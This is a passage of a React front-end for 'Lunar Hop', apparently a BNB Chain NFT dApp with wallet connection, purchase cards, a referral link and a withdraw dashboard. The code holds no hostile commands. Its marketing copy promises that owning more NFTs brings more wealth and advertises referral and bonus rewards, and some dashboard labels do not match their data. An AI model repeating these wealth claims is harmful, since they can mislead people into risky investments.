                                    <Row>${depoAmount}</Row>
                                    <Row><small className="text-muted">{depoStart}</small></Row>
                                </Col>
                            </DropdownItem>
                            <div></div>
                        </>
                    )
                }
            }
        )
        return (
            <>
                <ButtonDropdown className="custom-button source mt-4" toggle={() => { setOpen(!dropdownOpen) }}
                    isOpen={dropdownOpen}>
                    <DropdownToggle outline caret className="font-weight-bold source">
                        Unstake
                    </DropdownToggle>
                    <DropdownMenu>
                        <DropdownItem header style={{ color: 'black' }}>Your current stakes
                        </DropdownItem>
                        {listElements}
                    </DropdownMenu>
                </ButtonDropdown>
            </>
        )
    }

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    //    RENDER
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    return (
        <>
            {mobile === true ? (
                <div className="mobile_head">
                    <div className="mobile_herader_content">
                        <div style={{ alignSelf: "center", marginBottom: "30px" }}>
                            <img src="./favicon.png" alt="ETH Snowball" height="64px" />
                        </div>
                        <div className="mobile_four_btn">
                            <div onClick={() => {
                                setMobile(true)
                            }}>
                                <a href="https://bscscan.com/address/0xbcae54cdf6a1b1c60ec3d44114b452179a96c1e3" target="_blank" rel="noreferrer"
                                    className="swap_btn"
                                    style={{
                                        color: 'white',
                                        textDecoration: 'none',
                                        fontWeight: "bolder",
                                        fontFamily: 'Roboto'
                                    }}
                                >
                                    CONTRACT
                                </a>
                            </div>
                            <div onClick={() => {
                                setMobile(true)
                            }}>
                                <a href="/whitepaper.pdf" target="_blank" rel="noreferrer"
                                    className="stable_btn"
                                    style={{
                                        color: 'white',
                                        textDecoration: 'none',
                                        fontWeight: "bolder",
                                        fontFamily: 'Roboto'
                                    }}
                                >
                                    <span> HOP PAPER </span>
                                </a>
                            </div>
                            <div onClick={() => {
                                setMobile(true)
                            }}>
                                <a href="/whitepaper.pdf" target="_blank" rel="noreferrer"
                                    className="stable_btn"
                                    style={{
                                        color: 'white',
                                        textDecoration: 'none',
                                        fontWeight: "bolder",
                                        fontFamily: 'Roboto'
                                    }}
                                >
                                    <span> BUY NFT </span>
                                </a>
                            </div>
                            
                        </div>
                        <div style={{ flex: 1 }}></div>
                        <div
                            className="mobile_connect"
                        >
                            <Button
                                className='custom-button'
                                style={{ maxHeight: "43px", backgroundColor: '#000000b8', color: '#ffbb00' }}
                                onClick={requestAccount}>
                                {connectButtonText}
                            </Button>
                        </div>
                    </div>
                    <div
                        className="empty_mobile"
                        onClick={() => {
                            setMobile(false)
                        }}
                    ></div>
                </div>
            )
            : null}
            <div className="custom-header">
                {/* <Card className="px-5 py-2"> */}
                {/* <img
                    alt="..."
                    src="./favicon.png"
                    style={{ width: 'auto', height: '96px' }}
                /> */}
                <h2 className="text-white font-weight-bolder">LUNAR HOP</h2>
                {/* </Card> */}
                <div className="header_menu">
                    <Item>
                        <a href="https://bscscan.com/address/0xbcae54cdf6a1b1c60ec3d44114b452179a96c1e3" target="_blank" rel="noreferrer"
                            style={{
                                textDecoration: 'none',
                                fontWeight: "bolder",
                            }}
                        >
                            <span>CONTRACT </span>
                            {/* <SiBinance/> */}
                        </a>
                    </Item>
                    <Item>
                        <a href="/whitepaper.pdf" target="_blank"
                            style={{
                                textDecoration: 'none',
                                fontWeight: "bolder",
                            }}
                        >
                            <span>HOP PAPER</span>
                            {/* <FaDiscord/> */}
                        </a>
                    </Item>
                    <Item>
                        <a href="/whitepaper.pdf" target="_blank"
                            style={{
                                textDecoration: 'none',
                                fontWeight: "bolder",
                            }}
                        >
                            <span>BUY NFT</span>
                            {/* <FaDiscord/> */}
                        </a>
                    </Item>
                </div>

                <Button
                    className='custom-button desktop-button'
                    style={{ maxHeight: "43px", backgroundColor: '#FEB800', color: 'white' }}
                    onClick={requestAccount}>
                    {connectButtonText}
                </Button>
                <div
                    className='mobile_btn'
                    onClick={() => {
                        setMobile(true)
                    }}
                >
                    <GiHamburgerMenu />
                </div>
            </div>

            <Container>
                <CardDeck>
                    <Card className='banner-card'>
                        <h2 className='text-green font-weight-bolder'>Welcome to the Lunar Hop NFT!</h2>
                        <h6 className='text-white font-weight-bold' style={{lignHeight:'2.2rem'}}>The NFT collectibles that will attract good luck and make your wallet puff! The more Lunar Hop NFT you have, the greater the wealth you will attract.</h6>
                    </Card>
                    <Card className="banner-card">
                        <img
                            alt="..."
                            src={ rabbitsImg }
                        />
                        {/* <video src={ bannerVid } playsInline loop="true" muted="unmuted" width="100%" style={{borderRadius:'8px'}} ref={videoRef}></video> */}
                    </Card>
                </CardDeck>
            </Container>

            <div className='main-content'>
                <Container className="pt-3">
                    
                    <TabsContainer className="pt-3">
                        <Tabs selectedTab={activeTab} onChange={handleChange}>
                            <Tab label="Marketplace" value={0}></Tab>
                            <Tab label="Dashboard" value={1}></Tab>
                            {/* <Tab label="LOTTERY" value={2}></Tab> */}
                        </Tabs>
                    </TabsContainer>

                    <TabPanel value={activeTab} selectedIndex={0}>
                        <Row>
                            <Col className="text-center">
                                <h3 className='py-3 text-white font-weight-bolder'>Purchase Lunar Hop NFT</h3>
                            </Col>
                        </Row>
                        <CardDeck style={{justifyContent: 'center'}}>
                            {nutritionFacts1.map((item, index) => (
                                <div className='nft-card'>
                                    <Typography variant="h5">
                                        {item[0].name}
                                    </Typography>
                                    <img src={item[0].path} alt="nft" width="100%" style={{borderRadius: '20px'}}/>
                                    <CardContent>
                                        <Box paddingTop={2}>
                                            {item[1].properties.map((f) => (
                                                <Grid container key={f.label} justifyContent="space-between">
                                                <Typography variant="body1" className='text-white' gutterBottom >
                                                {f.label}
                                                </Typography>
                                                <Typography className='text-white' gutterBottom >{f.value}</Typography>
                                            </Grid>
                                            ))}
                                        </Box>
                                        <div style={{textAlign:'center', display:'flex', justifyContent:'space-between'}}>
                                            <button className='btn_buy' >Approve</button>
                                            <button className='btn_buy' >Buy</button>
                                        </div>
                                    </CardContent>
                                </div>
                            ))}
                        </CardDeck>
                        <CardDeck style={{justifyContent: 'center'}}>
                            {nutritionFacts2.map((item, index) => (
                                <div className='nft-card'>
                                    <Typography variant="h5" color="white" paddingBottom={1}>
                                        {item[0].name}
                                    </Typography>
                                    <img src={item[0].path} alt="nft" width="100%" style={{borderRadius: '20px'}}/>
                                    <CardContent>
                                        <Box paddingTop={2}>
                                            {item[1].properties.map((f) => (
                                                <Grid container key={f.label} justifyContent="space-between">
                                                <Typography variant="body1" className='text-white' gutterBottom >
                                                {f.label}
                                                </Typography>
                                                <Typography className='text-white' gutterBottom >{f.value}</Typography>
                                            </Grid>
                                            ))}
                                        </Box>
                                        <div style={{textAlign:'center', display:'flex', justifyContent:'space-between'}}>
                                            <button className='btn_buy' >Approve</button>
                                            <button className='btn_buy' >Buy</button>
                                        </div>
                                    </CardContent>
                                </div>
                            ))}
                        </CardDeck>
                        
                    </TabPanel>
                    <TabPanel value={activeTab} selectedIndex={1}>
                        <Container className='my-4'>
                            <CardDeck>
                                <Card body className="text-center">
                                    <h5 className="calvino text-white">Wealth Gained</h5>
                                    <h5 className="source font-weight-bold text-lightblue">
                                        {Number(contractBalance) === 0 ? <>$0</> : <>${Number(contractBalance).toFixed(0)}</>}
                                    </h5>
                                </Card>
                                <Card body className="text-center">
                                    <h5 className="calvino text-white">Daily Earnings</h5>
                                    <h5 className="source font-weight-bold text-lightblue">
                                        {Number(totalUsers) === 0 ? <>?</> : <>{Number(totalUsers)}</>}
                                    </h5>
                                </Card>
                                <Card body className="text-center">
                                    <h5 className="calvino text-white">Referral Rewards</h5>
                                    <h5 className="source font-weight-bold text-lightblue">
                                        10%
                                    </h5>
                                </Card>
                            </CardDeck>
                        </Container>
                        <CardDeck className="p-3">
                            <Card body className="text-center text-lightblue">
                                <CardDeck className="sub-card">
                                    <Card>
                                        <h4 className="calvino text-white">Total Wealth Earned</h4>
                                        <CardDeck>
                                            <Card style={{ background: "transparent" }}>
                                                <h4 className="source font-weight-bold text-white"><TotalEarnedPercent /></h4>
                                            </Card>
                                            <Card style={{ background: "transparent" }}>
                                                <h4 className="source font-weight-bold text-white">$<TotalEarnedValue /></h4>
                                            </Card>
                                        </CardDeck>
                                        <Row>
                                            <Col>
                                                {/* <Button className="custom-button source mt-3" outline onClick={compound}>compound</Button> */}
                                                <Button className="custom-button source mt-3" outline onClick={withdrawDivs}>Withdraw</Button>
                                            </Col>
                                        </Row>
                                    </Card>
                                    <Card style={{alignSelf:'center'}}>
                                        <img src={coinImg} width="150px" alt="chinese coin"/>
                                    </Card>
                                </CardDeck>
                            </Card>
                        </CardDeck>
                        <CardDeck className="pl-3 pr-3 pb-3">
                            <Card body className="text-center text-lightblue">
                                <CardDeck className="sub-card">
                                    <Card>
                                        <h4 className="calvino text-white">Referral Link</h4>
                                        {/* <h3 type="button" onClick={() => navigator.clipboard.writeText("https://busd.wcminer.com?ref=" + userWalletAddress)} className="referralButton source font-weight-bold"><FaCopy size="1.6em" className="pr-3" />COPY LINK</h3> */}
                                        <Form onClick={() => navigator.clipboard.writeText(window.location + "?ref=" + userWalletAddress)}>
                                            <FormGroup>
                                                <InputGroup>
                                                    <Input
                                                        className="custom-input text-center source"
                                                        placeholder={window.location + "?ref=" + userWalletAddress}
                                                        disabled
                                                    >
                                                    {/* <FaCopy style={{background:'white'}}/> */}
                                                    </Input>
                                                </InputGroup>
                                            </FormGroup>
                                        </Form>
                                        <small className="source text-lightblue">Earn 10% of every buy when someone uses your referral link!</small>
                                    </Card>
                                    <Card style={{alignSelf:'center'}}>
                                        <img src={gateImg} width="150px" alt="chinese coin"/>
                                    </Card>
                                </CardDeck>
                            </Card>
                        </CardDeck>
                        {/* <CardDeck className="pt-2 pr-3 pl-3 pb-3">
                            <Card body className="text-center text-lightblue">
                                <h4 className="calvino text-lightblue" style={{ lineHeight: "10px" }}>CURRENT STAKES</h4>
                                <small className="pt-0 pb-4 source">Here's a list of all of your current stakes.</small>
                                <ListOfUserStakes />
                            </Card>
                            <Card hidden body className="text-center text-lightblue">
                                <h4 className="calvino text-lightblue">Days Staked</h4>
                                <h3 className="source font-weight-bold text-white">2 days</h3>
                            </Card>
                            <Card hidden body className="text-center text-lightblue">
                                <h4 className="calvino text-lightblue">Time to Max</h4>
                                <CardDeck>
                                    <Card>
                                        <h4 className="source font-weight-bold text-white">?</h4>
                                        <small className="source">days until max</small>
                                    </Card>
                                    <Card>
                                        <h4 className="source font-weight-bold text-white">$</h4>
                                        <small className="source">max per day</small>
                                    </Card>
                                </CardDeck>
                            </Card>
                            <Card hidden body className="text-center text-lightblue">
                                <h4 className="calvino text-lightblue">Current Unstake Fee</h4>
                                <h3 className="source font-weight-bold text-white">20%</h3>
                                <small className="source text-lightblue">days until decrease to 12%</small>
                            </Card>
                        </CardDeck> */}
                    </TabPanel>

                    <TabPanel value={activeTab} selectedIndex={2}>
                        <h4 className="pt-5 text-center text-white">(COMING SOON)</h4>
                        <CardDeck className="p-5">

                            <Card body className="text-center text-lightblue">
                                <h4 className="calvino text-lightblue">LOTTERY</h4>

                                <Box component="div" className='p-2 pb-5'>
                                    <Grid
                                        container
                                        alignItems="center"
                                        justifyContent="space-between"
                                    >
                                        <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            POT SIZE
                                        </Typography>
                                        <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            $0
                                        </Typography>
                                    </Grid>

                                    <Grid
                                        container
                                        alignItems="center"
                                        justifyContent="space-between"
                                    >
                                        <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            TOTAL PLAYERS
                                        </Typography>
                                        <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            0
                                        </Typography>
                                    </Grid>

                                    <Grid
                                        container
                                        alignItems="center"
                                        justifyContent="space-between"
                                    >
                                        <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            TOTAL TICKETS
                                        </Typography>
                                        <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            0
                                        </Typography>
                                    </Grid>

                                    <Grid
                                        container
                                        alignItems="center"
                                        justifyContent="space-between"
                                    >
                                        <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            MY TICKETS
                                        </Typography>
                                        <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            0
                                        </Typography>
                                    </Grid>

                                    <Grid
                                        container
                                        alignItems="center"
                                        justifyContent="space-between"
                                    >
                                        <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            PROBABILITY OF WINNING
                                        </Typography>
                                        <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            0
                                        </Typography>
                                    </Grid>

                                    <Grid
                                        container
                                        alignItems="center"
                                        justifyContent="space-between"
                                    >
                                        <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            PREVIOUS WINNER
                                        </Typography>
                                        <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            0
                                        </Typography>
                                    </Grid>

                                    <Grid
                                        container
                                        alignItems="center"
                                        justifyContent="space-between"
                                    >
                                        <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            PREVIOUS POT SIZE
                                        </Typography>
                                        <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                            0
                                        </Typography>
                                    </Grid>
                                </Box>

                                <Form>
                                    <FormGroup>
                                        <InputGroup>
                                            <Input
                                                className="custom-input text-center source"
                                                placeholder="ENTER TICKETS AMOUNT"
                                                disabled
                                            ></Input>
                                        </InputGroup>
                                    </FormGroup>
                                </Form>

                                <Button className="custom-button source mt-3" style={{ width: '100%' }} outline onClick={() => { }} disabled>buy tickets</Button>
                                <Button className="custom-button source mt-3" style={{ width: '100%' }} outline onClick={() => { }} disabled>collect winnings</Button>
                                <Button className="custom-button source mt-3" style={{ width: '100%' }} outline onClick={() => { }} disabled>send to miner (100% bonus)</Button>
                            </Card>
                        </CardDeck>
                    </TabPanel>
                </Container>
            </div>
            <Container style={{marginTop:'50px'}}>
                <h3 className='py-3 text-white text-center font-weight-bolder'>Frequently Asked Questions</h3>
                <Accordion style={{padding:'0px 30px'}}>
                {faqData.map((item, index) => {
                    return (
                        // <Reveal key={index} className='onStep' keyframes={fadeInUp} delay={100 * index} duration={800}>
                        <Accordion.Item eventKey={{ index }}>
                            <Accordion.Header style={{margin: 'auto'}}>
                                <div className="faqheading">
                                    {item.title}
                                </div>
                                {/* <img id='plus' src={plusIcon}/>
                                <img id='minus' src={minusIcon}/> */}
                            </Accordion.Header>
                            <Accordion.Body className="faqbody">
                                {item.content}
                            </Accordion.Body>
                        </Accordion.Item>
                        // </Reveal>
                    )
                }
                )}
                </Accordion>
            </Container>            

            <div className="pt-3 text-center calvino text-lightblue">
                <Card style={{ borderRadius: '0px', padding: '40px 10px 30px 10px' }}>
                    <CardDeck className="custom-footer">
                        {/* <a href="https://georgestamp.xyz/2022/09/wc-miner-busd/" target="_blank" rel="noreferrer"> AUDIT </a> */}
                        {/* <SelectObject value={auditNo} onChangeAuditNo={onChangeAuditNo}/> */}
                        <a href="https://bscscan.com/address/" target="_blank" rel="noreferrer"> CONTRACT </a>
                        <a href="/whitepaper.pdf" target="_blank" rel="noreferrer"> DOCS </a>
                        <a href="https://twitter.com/" target="_blank" rel="noreferrer"> TWITTER </a>
                        <a href="https://t.me/" target="_blank" rel="noreferrer"> TELEGRAM </a>
                    </CardDeck>
                    <p style={{ fontSize: '20px', color: 'white', paddingTop: '30px', fontWeight: 'bold' }}>© Luner Hop Team , All Rights Reserved</p>
                </Card>
            </div>
        </>

    )
}
export default WealthMountain;